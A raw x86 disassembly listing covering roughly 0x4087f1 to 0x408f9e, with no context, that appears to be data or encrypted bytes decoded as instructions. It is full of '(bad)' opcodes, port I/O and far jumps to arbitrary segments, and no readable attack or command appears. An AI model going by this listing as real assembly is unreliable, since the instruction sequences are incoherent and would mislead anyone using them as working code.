  4087f1:	jae    0x40883d
  4087f3:	clc    
  4087f4:	cmp    ecx,DWORD PTR [edi]
  4087f6:	push   eax
  4087f7:	mov    cl,0xf2
  4087f9:	xor    eax,0xfc6822b5
  4087fe:	dec    edi
  4087ff:	mov    ds:0xcfc2604e,eax
  408804:	(bad)  
  408805:	and    BYTE PTR [eax+0x6a],dh
  408808:	sub    BYTE PTR [edi],cl
  40880a:	jne    0x408861
  40880c:	(bad)  
  40880d:	fisub  DWORD PTR [ecx+0x6f87565b]
  408813:	test   al,0xd9
  408815:	pop    ebp
  408816:	loopne 0x40880d
  408818:	adc    BYTE PTR [esi+0x1c],cl
  40881b:	imul   esp,esp,0x8e4d609a
  408821:	pop    ecx
  408822:	mov    dh,0xf8
  408824:	(bad)  
  408825:	repnz add ch,ah
  408828:	aad    0xc8
  40882a:	jmp    0x1cff:0xabcdb71f
  408831:	push   ss
  408832:	div    DWORD PTR [eax]
  408834:	cmp    bh,BYTE PTR [edx-0x48]
  408837:	test   BYTE PTR [ecx],0xdd
  40883a:	adc    ch,0x9f
  40883d:	jp     0x4087c4
  40883f:	fldl2t 
  408841:	in     al,dx
  408842:	xchg   ebp,eax
  408843:	cs inc esp
  408845:	jmp    0x4088a8
  408847:	mov    ebp,0x9eb8d920
  40884c:	sahf   
  40884d:	repz mov edx,0x926cda0d
  408853:	push   ds
  408854:	test   al,0x89
  408856:	or     ah,al
  408858:	inc    ebp
  408859:	js     0x4088a2
  40885b:	in     eax,dx
  40885c:	jns    0x4088ce
  40885e:	ret    
  40885f:	mov    ecx,0x10f6d111
  408864:	or     al,cl
  408866:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408867:	dec    edi
  408868:	xor    edx,DWORD PTR [ecx]
  40886a:	test   eax,0xae5f78c0
  40886f:	sahf   
  408870:	ss aas 
  408872:	shl    BYTE PTR [edx+0x2f],0xb4
  408876:	stos   BYTE PTR es:[edi],al
  408877:	sbb    al,0x1f
  408879:	(bad)  
  40887a:	fwait
  40887b:	jecxz  0x4088d4
  40887d:	adc    BYTE PTR [ebx+0x66],cl
  408880:	dec    ebx
  408881:	in     eax,0x96
  408883:	(bad)  
  408884:	retf   
  408885:	add    al,0x16
  408887:	mov    cl,0xbb
  408889:	inc    BYTE PTR [esi+0x65]
  40888c:	pushf  
  40888d:	xor    DWORD PTR [eax-0x629f3459],ecx
  408893:	sar    DWORD PTR [edi-0x1103ef4f],1
  408899:	sbb    DWORD PTR fs:[edx+0x67c9eaeb],edx
  4088a0:	nop
  4088a1:	imul   DWORD PTR [ecx]
  4088a3:	jne    0x4088ae
  4088a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088a6:	pop    ecx
  4088a7:	xchg   dl,cl
  4088a9:	dec    ebx
  4088aa:	dec    ebp
  4088ab:	aam    0x26
  4088ad:	adc    DWORD PTR [edx+ebp*2],esi
  4088b0:	test   al,0xdd
  4088b2:	xlat   BYTE PTR ds:[ebx]
  4088b3:	add    DWORD PTR [edi],ecx
  4088b5:	out    dx,eax
  4088b6:	push   ecx
  4088b7:	mov    cl,0x56
  4088b9:	jp     0x4088dc
  4088bb:	jmp    0x4088cb
  4088bd:	mov    edx,0xce14f700
  4088c2:	push   ds
  4088c3:	stos   BYTE PTR es:[edi],al
  4088c4:	out    dx,al
  4088c5:	mov    eax,ds:0x7d98f5c7
  4088ca:	rol    BYTE PTR [esi],0x60
  4088cd:	scas   eax,DWORD PTR es:[edi]
  4088ce:	add    al,0x60
  4088d0:	xchg   BYTE PTR [esi-0x24],al
  4088d3:	jo     0x408951
  4088d5:	in     eax,dx
  4088d6:	sub    dh,BYTE PTR [ebp+0x7ddc7ba5]
  4088dc:	mov    edx,0x9d0d9e24
  4088e1:	xlat   BYTE PTR ds:[ebx]
  4088e2:	es jb  0x40886f
  4088e5:	shl    DWORD PTR [edx+0x3f],0x88
  4088e9:	loop   0x40893d
  4088eb:	mov    eax,0x291788c8
  4088f0:	push   ss
  4088f1:	xor    bh,BYTE PTR [ecx+eiz*2]
  4088f4:	pusha  
  4088f5:	mov    dl,0xe8
  4088f7:	(bad)  
  4088f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088f9:	outs   dx,DWORD PTR ds:[esi]
  4088fa:	push   ss
  4088fb:	(bad)  
  4088fc:	pop    ecx
  4088fd:	adc    cl,0x72
  408900:	mov    al,0xb4
  408902:	sbb    cl,BYTE PTR [edi+0x4a]
  408905:	repz inc edx
  408907:	sbb    edx,DWORD PTR [edi]
  408909:	pop    edi
  40890a:	pop    edi
  40890b:	nop
  40890c:	add    eax,0xee07129f
  408911:	das    
  408912:	pusha  
  408913:	popa   
  408914:	retf   
  408915:	fadd   st,st(6)
  408917:	or     dl,bl
  408919:	pop    ebp
  40891a:	mul    BYTE PTR [edi]
  40891c:	nop
  40891d:	mov    ecx,0xf9d08c87
  408922:	daa    
  408923:	xchg   esi,eax
  408924:	jge    0x4088c1
  408926:	push   edx
  408927:	cs retf 0x4f8
  40892b:	and    al,0xed
  40892d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40892e:	sub    ch,BYTE PTR [ebp-0x1d648289]
  408934:	mov    ecx,0x6f3b1ff7
  408939:	mov    ebx,ds
  40893b:	test   al,0x80
  40893d:	mov    ds:0x36547dd6,eax
  408942:	sahf   
  408943:	lea    esi,[edi+0x654b3525]
  408949:	or     cl,BYTE PTR [edi]
  40894b:	aaa    
  40894c:	mov    al,BYTE PTR ds:[eax]
  40894f:	cmp    eax,DWORD PTR [edi]
  408951:	push   es
  408952:	or     al,0x5d
  408955:	or     eax,0xad381d0
  40895a:	cwde   
  40895b:	sar    DWORD PTR [edi+0x74cec646],1
  408961:	push   ss
  408962:	stc    
  408963:	inc    esp
  408964:	mov    dh,0xcf
  408966:	inc    ebx
  408967:	xchg   esp,eax
  408968:	dec    esi
  408969:	mov    edi,0x36c6d46b
  40896e:	(bad)  
  40896f:	ja     0x40894f
  408971:	rcr    BYTE PTR [edi],1
  408973:	fcom   st(2)
  408975:	mov    ds:0x8431ade3,eax
  40897a:	push   edx
  40897b:	jecxz  0x40898c
  40897d:	cmp    BYTE PTR [esp+ebp*1],0x2
  408981:	scas   eax,DWORD PTR es:[edi]
  408982:	jne    0x408935
  408984:	imul   esi,DWORD PTR ds:0xdbbabb7e,0xc3d0e72
  40898e:	out    0x2c,al
  408990:	xchg   edi,eax
  408991:	ins    DWORD PTR es:[edi],dx
  408992:	out    dx,eax
  408993:	das    
  408994:	pop    ebp
  408995:	jns    0x40893a
  408997:	paddb  mm6,QWORD PTR [esi]
  40899a:	or     dl,BYTE PTR [ecx]
  40899c:	ret    
  40899d:	inc    esp
  40899e:	std    
  40899f:	sahf   
  4089a0:	xchg   ebp,eax
  4089a1:	mul    DWORD PTR [ebx]
  4089a3:	icebp  
  4089a4:	clc    
  4089a5:	mov    ch,0xe1
  4089a7:	icebp  
  4089a8:	cld    
  4089a9:	in     al,0xcc
  4089ab:	xor    al,0x5d
  4089ad:	mov    ebx,0x10c7521e
  4089b2:	cli    
  4089b3:	cmp    edi,ebp
  4089b5:	push   cs
  4089b6:	fchs   
  4089b8:	or     eax,0x8b8b386e
  4089bd:	fist   DWORD PTR [edi]
  4089bf:	loopne 0x408950
  4089c1:	inc    esp
  4089c2:	out    dx,al
  4089c3:	lock cmp ecx,DWORD PTR [edi-0xb]
  4089c7:	xor    eax,0x4c83651
  4089cc:	shl    BYTE PTR [ecx],0x7f
  4089cf:	sti    
  4089d0:	xchg   ebp,eax
  4089d1:	xchg   dl,ch
  4089d3:	int    0x12
  4089d5:	cld    
  4089d6:	icebp  
  4089d7:	dec    edx
  4089d8:	out    0xdf,al
  4089da:	dec    eax
  4089db:	ins    BYTE PTR es:[edi],dx
  4089dc:	jbe    0x408a26
  4089de:	sahf   
  4089df:	jae    0x40897e
  4089e1:	sbb    dh,ah
  4089e3:	mov    bl,0xeb
  4089e5:	es or  eax,0xa60f01b0
  4089eb:	jae    0x408a30
  4089ed:	mov    esp,0x1855f15a
  4089f2:	dec    eax
  4089f3:	leave  
  4089f4:	jne    0x408a31
  4089f6:	jp     0x4089b8
  4089f8:	lahf   
  4089f9:	mov    bh,ch
  4089fb:	js     0x408a0f
  4089fd:	pop    ds
  4089fe:	xchg   esi,eax
  4089ff:	mov    cl,0x40
  408a01:	out    dx,eax
  408a02:	in     eax,dx
  408a03:	jo     0x4089c4
  408a05:	jne    0x408a27
  408a07:	push   ss
  408a08:	pop    esi
  408a09:	mov    cl,0x65
  408a0b:	or     dh,BYTE PTR [edx-0x799f380b]
  408a11:	cmc    
  408a12:	stos   BYTE PTR es:[edi],al
  408a13:	std    
  408a14:	pusha  
  408a15:	je     0x408a24
  408a17:	leave  
  408a18:	sub    DWORD PTR [ebx-0x69],ecx
  408a1b:	xchg   esi,eax
  408a1c:	mov    esp,0xdd176037
  408a21:	cld    
  408a22:	clc    
  408a23:	or     eax,0x7c067747
  408a28:	cmp    eax,0x330cea43
  408a2d:	pop    edx
  408a2e:	mov    ds,WORD PTR [esi]
  408a30:	mov    dl,0x14
  408a32:	inc    eax
  408a33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a34:	int    0x4d
  408a36:	out    0xb0,al
  408a38:	xchg   DWORD PTR [eax],edx
  408a3a:	aad    0xf5
  408a3c:	gs mov bh,0xee
  408a3f:	lahf   
  408a40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a41:	pop    ebx
  408a42:	daa    
  408a43:	adc    BYTE PTR [esi+0x6d],0xf8
  408a47:	sub    DWORD PTR [esi-0x62],ebp
  408a4a:	fs stos DWORD PTR es:[edi],eax
  408a4c:	adc    ah,0x8
  408a4f:	cmp    BYTE PTR [ecx+eax*2],cl
  408a52:	mov    ds:0xd12e19ed,al
  408a57:	cmp    al,dh
  408a59:	dec    esi
  408a5a:	push   ebp
  408a5b:	add    BYTE PTR [ebx],ch
  408a5d:	aad    0x6e
  408a5f:	jmp    0x408a23
  408a61:	pop    ds
  408a62:	dec    ebx
  408a63:	push   esp
  408a64:	mov    esp,0xe9b9cc89
  408a69:	sbb    DWORD PTR [edx],ebx
  408a6b:	pop    ebp
  408a6c:	mov    ah,0x8e
  408a6e:	xor    ah,BYTE PTR [ebp+0x4027e3e3]
  408a74:	cmp    BYTE PTR [edi],bh
  408a76:	mov    es,edx
  408a78:	dec    BYTE PTR [esi+esi*8+0x4f]
  408a7c:	into   
  408a7d:	mov    ?,WORD PTR [ebp+0x64]
  408a80:	(bad)  
  408a81:	adc    WORD PTR [eax+eiz*4+0x14],0xff81
  408a87:	jb     0x408a2a
  408a89:	cmp    ah,BYTE PTR [esi+eiz*4+0x68]
  408a8d:	aas    
  408a8e:	dec    ebx
  408a8f:	pop    edi
  408a90:	cmp    ah,0xb5
  408a93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a94:	pop    esi
  408a95:	aam    0xed
  408a97:	add    DWORD PTR [ecx+0x596719e7],edi
  408a9d:	mov    esi,0x99dd765c
  408aa2:	fs adc al,0xc2
  408aa5:	or     DWORD PTR ss:[ebp+0x3d],0x9
  408aaa:	repnz cmp ch,BYTE PTR [edi-0x34d2db13]
  408ab1:	push   es
  408ab2:	mov    ebx,0xd63c8110
  408ab7:	test   eax,0x2d6e06bc
  408abc:	xor    al,0xd2
  408abe:	popa   
  408abf:	pop    edi
  408ac0:	pop    ds
  408ac1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ac2:	ins    DWORD PTR es:[edi],dx
  408ac3:	dec    ecx
  408ac4:	ins    BYTE PTR es:[edi],dx
  408ac5:	call   0x2d27:0x1eb5cc66
  408acc:	js     0x408ae0
  408ace:	jnp    0x408b4e
  408ad0:	aad    0xea
  408ad2:	dec    ebx
  408ad3:	jecxz  0x408a67
  408ad5:	add    ecx,0xcead7f12
  408adb:	mov    edi,0x4d23b03
  408ae0:	mov    esp,0x70656014
  408ae5:	jns    0x408afc
  408ae7:	xchg   ebx,eax
  408ae8:	and    BYTE PTR [ecx-0x3c],bl
  408aeb:	push   ebx
  408aec:	ret    
  408aed:	mov    al,ds:0xe074813e
  408af2:	dec    ecx
  408af3:	call   0x301e:0xa7118071
  408afa:	push   ebx
  408afb:	out    dx,al
  408afc:	addr16 dec ebx
  408afe:	xor    eax,0xdd25d6b6
  408b03:	stos   BYTE PTR es:[edi],al
  408b04:	mov    edx,0x89f78c8b
  408b09:	jge    0x408b8a
  408b0b:	adc    eax,0xdcb0085
  408b10:	jge    0x408ac9
  408b12:	pop    ebx
  408b13:	call   0x344c:0x393b1597
  408b1a:	dec    eax
  408b1b:	repz fld TBYTE PTR [edi]
  408b1e:	imul   ecx
  408b20:	jge    0x408ae7
  408b22:	jl     0x408ad6
  408b24:	sbb    DWORD PTR [ebx+0x47],edi
  408b27:	stos   BYTE PTR es:[edi],al
  408b28:	sbb    al,BYTE PTR [ecx]
  408b2a:	int    0xf7
  408b2c:	les    edi,FWORD PTR [ebx]
  408b2e:	(bad)  
  408b30:	cmp    al,0x32
  408b32:	data16 adc BYTE PTR [edi],ch
  408b35:	mov    esi,DWORD PTR [ecx-0x1a]
  408b38:	push   ds
  408b39:	mov    ebp,0x6cf3de0f
  408b3e:	pop    eax
  408b3f:	mov    ebp,0xa35bcf7f
  408b44:	packsswb mm0,QWORD PTR [edx+ebx*2+0x1288945a]
  408b4c:	cli    
  408b4d:	sbb    DWORD PTR [edx+0x71eb4a7c],ebx
  408b53:	mov    WORD PTR [eax+0x563243b6],ss
  408b59:	mov    ebx,DWORD PTR [esi-0xb04ba44]
  408b5f:	add    ch,BYTE PTR ds:0xc9370b0b
  408b65:	call   0xc987:0x402e16a0
  408b6c:	enter  0x9be4,0xae
  408b70:	jmp    DWORD PTR [edx]
  408b72:	sbb    BYTE PTR [edx],ch
  408b74:	(bad)  
  408b75:	sbb    edi,DWORD PTR [ebp-0xbd2d6dd]
  408b7b:	xchg   edi,eax
  408b7c:	or     ch,BYTE PTR [edx-0xdab9440]
  408b82:	dec    ebx
  408b83:	fdiv   DWORD PTR [edx+0x22]
  408b86:	add    DWORD PTR ds:0x13854a53,esi
  408b8c:	or     edi,eax
  408b8e:	test   ecx,ecx
  408b90:	cmp    ebx,eax
  408b92:	inc    esi
  408b93:	out    0x47,eax
  408b95:	xchg   BYTE PTR [ebp+ebp*2-0x2b],cl
  408b99:	lahf   
  408b9a:	inc    eax
  408b9b:	cdq    
  408b9c:	mov    ebp,0xc287ef64
  408ba1:	inc    esi
  408ba2:	xor    DWORD PTR [edi+0x3a],esi
  408ba5:	outs   dx,DWORD PTR ds:[esi]
  408ba6:	sahf   
  408ba7:	sbb    edi,0xffffffa9
  408baa:	or     BYTE PTR [edi],bl
  408bac:	mov    BYTE PTR [esi+0x2520b563],bl
  408bb2:	fcomp  st(6)
  408bb4:	sahf   
  408bb5:	hlt    
  408bb6:	stc    
  408bb7:	aam    0x99
  408bb9:	pop    esi
  408bba:	sbb    dh,bh
  408bbc:	jb     0x408b48
  408bbe:	daa    
  408bbf:	bound  edi,QWORD PTR [edi+edi*2+0x65]
  408bc3:	aaa    
  408bc4:	icebp  
  408bc5:	retf   0xccac
  408bc8:	rcr    BYTE PTR [ebp+esi*8+0x1db7413e],0x14
  408bd0:	sub    bh,BYTE PTR [esi]
  408bd2:	out    dx,eax
  408bd3:	inc    eax
  408bd4:	and    ah,ah
  408bd6:	add    esi,esp
  408bd8:	out    0x60,al
  408bda:	loope  0x408bdb
  408bdc:	sbb    ecx,esp
  408bde:	xchg   ebx,eax
  408bdf:	pushf  
  408be0:	lock sbb ah,ah
  408be3:	mov    gs,WORD PTR [edx+0x70587f0b]
  408be9:	jne    0x408c30
  408beb:	sub    BYTE PTR [edx+ebp*1-0x58c908ff],0xea
  408bf3:	mov    ah,0xc4
  408bf5:	push   ebx
  408bf6:	push   0x3b2cbff5
  408bfb:	test   DWORD PTR [ecx-0x30],eax
  408bfe:	ror    DWORD PTR [ebp+0x48cc3655],0x45
  408c05:	jmp    0x33a582f4
  408c0a:	add    cl,BYTE PTR [ecx]
  408c0c:	adc    bh,al
  408c0e:	out    0x4a,al
  408c10:	add    edi,DWORD PTR [ebx]
  408c12:	sbb    ebp,DWORD PTR [esi-0x32]
  408c15:	repz gs sbb al,0xae
  408c19:	xchg   ebp,eax
  408c1a:	inc    edi
  408c1b:	and    eax,0x6927b34
  408c20:	fmul   QWORD PTR [ecx-0x6f]
  408c23:	sbb    eax,0x6379201d
  408c28:	jae    0x408bee
  408c2a:	addr16 stc 
  408c2c:	jge    0x408c2f
  408c2e:	push   edi
  408c2f:	mov    esp,0x511e7989
  408c34:	out    dx,eax
  408c35:	cmp    ebx,DWORD PTR [ecx-0x1f80dfa3]
  408c3b:	aas    
  408c3c:	xchg   edx,eax
  408c3d:	and    ecx,DWORD PTR [ebp+edx*8+0x59]
  408c41:	push   eax
  408c42:	aad    0xb1
  408c44:	inc    eax
  408c45:	mov    cl,0xf6
  408c47:	out    dx,al
  408c48:	fwait
  408c49:	dec    ecx
  408c4a:	sub    BYTE PTR [edx],bh
  408c4c:	inc    esi
  408c4d:	adc    BYTE PTR [ebx],0x51
  408c50:	xor    DWORD PTR [ebp-0x65d7e854],edi
  408c56:	mov    ebp,0x740a1837
  408c5b:	sub    dl,ch
  408c5d:	outs   dx,BYTE PTR ds:[esi]
  408c5e:	or     dl,dl
  408c60:	cmp    edi,DWORD PTR [edi-0x57]
  408c63:	shl    DWORD PTR [ebp+0x4ae4f3d7],0xf4
  408c6a:	dec    esp
  408c6b:	sub    BYTE PTR [esi+eax*1-0x1b165d10],cl
  408c72:	cdq    
  408c73:	jns    0x408cdc
  408c75:	out    dx,al
  408c76:	add    al,BYTE PTR [edi-0x3d]
  408c79:	mov    ecx,0xb58c9ea9
  408c7e:	sub    BYTE PTR [ebx],0x95
  408c81:	xchg   ebx,eax
  408c82:	inc    ebx
  408c83:	sub    DWORD PTR [edx+0x6b],0x14
  408c87:	add    ebx,DWORD PTR [esi-0x68]
  408c8a:	cmp    BYTE PTR [ecx+0x5],ch
  408c8d:	xchg   esi,eax
  408c8e:	int3   
  408c8f:	lahf   
  408c90:	imul   esp,DWORD PTR [esi-0x24fd95f8],0x5e
  408c97:	adc    DWORD PTR [eax+edx*8],esi
  408c9a:	inc    esi
  408c9b:	call   0xce1a:0xe8d45f96
  408ca2:	imul   edi,ebx,0xa2a43e27
  408ca8:	cmc    
  408ca9:	push   ebx
  408caa:	mov    ds:0x1edbe9bc,al
  408caf:	clc    
  408cb0:	push   DWORD PTR [eax-0x542c637]
  408cb6:	rol    DWORD PTR [eax],1
  408cb8:	adc    dl,BYTE PTR [esi-0x52]
  408cbb:	push   edi
  408cbc:	and    al,0x4d
  408cbe:	and    ebp,DWORD PTR [ebp+0x3df4d1b]
  408cc4:	xor    eax,0xf3929b50
  408cc9:	add    eax,0xd007ff00
  408cce:	jmp    0xd71125b0
  408cd3:	xor    al,0x3b
  408cd5:	retf   
  408cd6:	loope  0x408c7a
  408cd8:	mov    ch,0x3f
  408cda:	cli    
  408cdb:	mov    ah,0x73
  408cdd:	fisubr WORD PTR [ebx+0x0]
  408ce0:	je     0x408c8f
  408ce2:	dec    ebx
  408ce3:	dec    edi
  408ce4:	aaa    
  408ce5:	xchg   ebx,eax
  408ce6:	xor    eax,DWORD PTR [edx-0x116f5f35]
  408cec:	ss pop ebp
  408cee:	add    DWORD PTR [ebx-0x7d0f8644],edx
  408cf4:	dec    edx
  408cf5:	sub    BYTE PTR [edi+eax*1-0x342f9b52],dh
  408cfc:	jl     0x408cc0
  408cfe:	loopne 0x408d74
  408d00:	mov    BYTE PTR [di],cl
  408d03:	retf   0x987c
  408d06:	add    dh,BYTE PTR [eax-0x70988353]
  408d0c:	push   0x43
  408d0e:	inc    eax
  408d0f:	mov    edi,0x4b79b40c
  408d14:	jecxz  0x408d23
  408d16:	les    ecx,FWORD PTR [ebx]
  408d18:	jnp    0x408d20
  408d1a:	lods   al,BYTE PTR ds:[esi]
  408d1b:	xor    BYTE PTR [ebx],bl
  408d1d:	rcl    DWORD PTR [ebp-0x23],cl
  408d20:	adc    BYTE PTR [edi],0xb0
  408d23:	ffreep st(3)
  408d25:	and    eax,0xa93a284b
  408d2a:	and    ah,BYTE PTR [ecx+0x225910fa]
  408d30:	mov    bl,0x29
  408d32:	or     dh,dh
  408d34:	xor    al,0xb
  408d36:	add    cl,BYTE PTR [edi]
  408d38:	jo     0x408d36
  408d3a:	xor    eax,DWORD PTR [eax]
  408d3c:	(bad)  
  408d3d:	sti    
  408d3e:	push   eax
  408d3f:	dec    ebx
  408d40:	xchg   esi,eax
  408d41:	int    0x4b
  408d43:	pop    esp
  408d44:	cli    
  408d45:	and    edi,DWORD PTR [ecx-0x5ed96176]
  408d4b:	cs dec eax
  408d4d:	(bad)  
  408d4e:	scas   al,BYTE PTR es:[edi]
  408d4f:	leave  
  408d50:	mov    esi,0x40fedd32
  408d55:	je     0x408cde
  408d57:	mov    ds:0x3c86310f,al
  408d5c:	adc    DWORD PTR [edi],eax
  408d5e:	out    0x63,al
  408d60:	(bad)  
  408d61:	pop    ecx
  408d62:	aaa    
  408d63:	fadd   QWORD PTR [ebx+0x2d8b124b]
  408d69:	dec    ecx
  408d6a:	push   ebp
  408d6b:	and    al,bh
  408d6d:	or     ecx,DWORD PTR [edi]
  408d6f:	cmc    
  408d70:	xor    esi,edx
  408d72:	(bad)  
  408d73:	retf   0x9d19
  408d76:	push   es
  408d77:	into   
  408d78:	cmp    edi,edi
  408d7a:	xchg   ebx,eax
  408d7b:	pop    esp
  408d7c:	cs call 0xf7db:0x55b1615c
  408d84:	and    al,0xfc
  408d86:	mov    cl,0xed
  408d88:	imul   esi,DWORD PTR [ecx+0x72],0xd4db835c
  408d8f:	xchg   DWORD PTR [edx-0x756a354],eax
  408d95:	out    0x17,al
  408d97:	xor    DWORD PTR [edi+0x2f],edx
  408d9a:	mov    BYTE PTR [ebx+ebp*2-0x20157bc2],dl
  408da1:	xchg   ebp,eax
  408da2:	cmp    ch,dl
  408da4:	cs aas 
  408da6:	jae    0x408df9
  408da8:	mov    al,0xbe
  408daa:	jae    0x408d45
  408dac:	(bad)  
  408dad:	iret   
  408dae:	push   ebp
  408daf:	push   ebp
  408db0:	push   edi
  408db1:	retf   
  408db2:	add    eax,DWORD PTR ds:0x535ded92
  408db8:	sbb    al,0xa8
  408dba:	in     eax,0x69
  408dbc:	enter  0x7a24,0xa0
  408dc0:	int3   
  408dc1:	enter  0x58c2,0xe
  408dc5:	fstp   DWORD PTR [eax-0x2254aada]
  408dcb:	dec    ecx
  408dcc:	xchg   DWORD PTR [ebp+ebx*1+0x77],esp
  408dd0:	sub    DWORD PTR [esi+0x71],esp
  408dd3:	pop    es
  408dd4:	mov    dl,0xb5
  408dd6:	fs es aaa 
  408dd9:	test   BYTE PTR [eax],ch
  408ddb:	jg     0x408e0c
  408ddd:	hlt    
  408dde:	push   eax
  408ddf:	cmp    DWORD PTR [ebx-0x7a],0xb8cc1c8f
  408de6:	pop    esp
  408de7:	ds sub ebx,edx
  408dea:	out    0x30,al
  408dec:	mov    ds:0x51bd6fa5,al
  408df1:	or     esi,ecx
  408df3:	sub    ebx,DWORD PTR [ebp+0x17e705a]
  408df9:	cmc    
  408dfa:	push   ebx
  408dfb:	mov    ebx,0xcc9be251
  408e00:	sbb    DWORD PTR [edi-0x6f],ebx
  408e03:	push   cs
  408e04:	xor    ebx,DWORD PTR [eax]
  408e06:	cmp    BYTE PTR [edx-0x5125505],bl
  408e0c:	cmp    ebp,DWORD PTR [edx-0x1a]
  408e0f:	les    ebx,FWORD PTR [edx-0x3]
  408e12:	sbb    ah,al
  408e14:	lods   al,BYTE PTR ds:[esi]
  408e15:	push   0x64a7511a
  408e1a:	fsub   st(0),st
  408e1c:	inc    ecx
  408e1d:	retf   0x666f
  408e20:	sbb    ecx,DWORD PTR [edi+0x1edfc242]
  408e26:	xchg   esi,eax
  408e27:	jne    0x408e24
  408e29:	(bad)  
  408e2a:	icebp  
  408e2b:	mov    esi,0x65b6f2b0
  408e30:	leave  
  408e31:	mov    BYTE PTR [eax+0x239f1429],ch
  408e37:	inc    esp
  408e38:	scas   eax,DWORD PTR es:[edi]
  408e39:	xor    esp,0xfffffff2
  408e3c:	pop    ecx
  408e3d:	cmc    
  408e3e:	mov    eax,ds:0x56c5945e
  408e43:	cmp    BYTE PTR ds:[eax],al
  408e46:	adc    al,0xa
  408e48:	sub    al,0x2c
  408e4a:	pop    ecx
  408e4b:	sbb    DWORD PTR [edx-0x3a18a215],ebp
  408e51:	hlt    
  408e52:	inc    ebp
  408e53:	dec    eax
  408e54:	or     DWORD PTR [ecx],0x6a
  408e57:	mov    al,es:0xa5fc831f
  408e5d:	and    ah,BYTE PTR [ebx+0x50]
  408e60:	test   DWORD PTR ds:[ecx+0x4b05710d],0xe68c79fc
  408e6b:	adc    bh,bh
  408e6d:	inc    ebx
  408e6e:	fisubr WORD PTR [ebx]
  408e70:	inc    DWORD PTR [edx+0x62]
  408e73:	test   al,0x4d
  408e75:	sub    BYTE PTR [ebp+0x29525904],bh
  408e7b:	jmp    0x408e82
  408e7d:	push   ebx
  408e7e:	iret   
  408e7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e80:	pop    ebx
  408e81:	jo     0x408e44
  408e83:	pop    ss
  408e84:	repnz out 0x80,al
  408e87:	std    
  408e88:	repz std 
  408e8a:	adc    BYTE PTR [edi],0x8e
  408e8d:	jmp    0x942b:0xc469cf75
  408e94:	(bad)  
  408e95:	mov    DWORD PTR [ebx],ebx
  408e97:	xor    DWORD PTR [ecx+0x313e6e32],edx
  408e9d:	(bad)  
  408e9e:	iret   
  408e9f:	jl     0x408e6e
  408ea1:	pop    ebp
  408ea2:	and    dl,al
  408ea4:	push   0x5993a684
  408ea9:	adc    ebx,DWORD PTR [esi+ebx*8+0x337a6398]
  408eb0:	sub    DWORD PTR [esp+eax*1-0x3f],edx
  408eb4:	jb     0x408ef4
  408eb6:	xchg   esp,eax
  408eb7:	fcmovnu st,st(1)
  408eb9:	pop    edi
  408eba:	xor    ch,BYTE PTR [ebp+0x3e]
  408ebd:	leave  
  408ebe:	das    
  408ebf:	jmp    0x7ca54068
  408ec4:	inc    DWORD PTR [ebx-0x3e]
  408ec7:	sahf   
  408ec8:	lods   al,BYTE PTR ds:[esi]
  408ec9:	jg     0x408eb2
  408ecb:	mov    ds:0x694db822,eax
  408ed0:	fwait
  408ed1:	add    eax,0x4da84bce
  408ed6:	fstp   DWORD PTR [edi]
  408ed8:	sbb    al,0xb8
  408eda:	and    eax,0xd021ffd9
  408edf:	aaa    
  408ee0:	test   al,0xb3
  408ee2:	out    dx,eax
  408ee3:	mov    ebp,0xc640cb05
  408ee8:	sti    
  408ee9:	adc    eax,0xd6b43064
  408eee:	and    BYTE PTR [edi+esi*1+0x393d4260],ah
  408ef5:	je     0x408ed3
  408ef7:	call   0xca7c0d98
  408efc:	push   ebp
  408efd:	and    BYTE PTR [esi],0x21
  408f00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f01:	out    dx,eax
  408f02:	push   ebx
  408f03:	mov    bl,0x20
  408f05:	fisubr WORD PTR [edi+0x5e]
  408f08:	bound  ecx,QWORD PTR [ecx-0x2973b565]
  408f0e:	bound  edx,QWORD PTR [esi+ecx*8-0x5429296e]
  408f15:	jle    0x408f2e
  408f17:	xor    eax,DWORD PTR [edx+0x35a79fb2]
  408f1d:	xor    BYTE PTR [ebp+0x5e],0xda
  408f21:	(bad)  [edx]
  408f23:	stos   DWORD PTR es:[edi],eax
  408f24:	inc    ebx
  408f25:	lods   al,BYTE PTR ds:[esi]
  408f26:	lods   eax,DWORD PTR ds:[esi]
  408f27:	adc    eax,0x4b44fa09
  408f2c:	push   esi
  408f2d:	add    DWORD PTR [ebp+edx*8+0x1273811c],0xffffff9b
  408f35:	cwde   
  408f36:	inc    esp
  408f37:	ins    DWORD PTR es:[edi],dx
  408f38:	pop    es
  408f39:	dec    ebp
  408f3a:	sub    esi,0x1e
  408f3d:	xchg   edi,eax
  408f3e:	cmp    dh,bl
  408f40:	repnz add al,0x2a
  408f43:	pop    esi
  408f44:	and    DWORD PTR [eax-0x725464fa],ecx
  408f4a:	(bad)  
  408f4b:	call   0x8909f723
  408f50:	mov    eax,0x9d5adfad
  408f55:	enter  0xdd1b,0xe3
  408f59:	mov    bl,0x2f
  408f5b:	out    0x42,eax
  408f5d:	outs   dx,DWORD PTR ds:[esi]
  408f5e:	cwde   
  408f5f:	arpl   cx,bp
  408f61:	fistp  WORD PTR [ebx]
  408f63:	scas   al,BYTE PTR es:[edi]
  408f64:	ret    
  408f65:	(bad)  
  408f66:	cmp    BYTE PTR [eax-0x2e],bl
  408f69:	cmp    BYTE PTR [edi+0x15],0x1
  408f6d:	xor    bh,BYTE PTR ds:0x5c066f6e
  408f73:	loopne 0x408f6a
  408f75:	mov    edi,0x8b8e4847
  408f7a:	pop    ss
  408f7b:	mov    ds:0xc1f78e35,al
  408f80:	push   cs
  408f81:	mov    al,0xb5
  408f83:	xchg   DWORD PTR [esi-0x1e],edx
  408f86:	xchg   ebx,eax
  408f87:	xchg   esi,eax
  408f88:	sub    al,0x75
  408f8a:	pop    ss
  408f8b:	sahf   
  408f8c:	dec    ecx
  408f8d:	push   ds
  408f8e:	mov    al,0x63
  408f90:	sbb    BYTE PTR [ebx],dl
  408f92:	and    eax,0xd9ab493d
  408f97:	add    ah,BYTE PTR [ebp+0x61]
  408f9a:	xor    BYTE PTR [eax+eax*1+0x34],ch
  408f9e:	and    ebx,esi
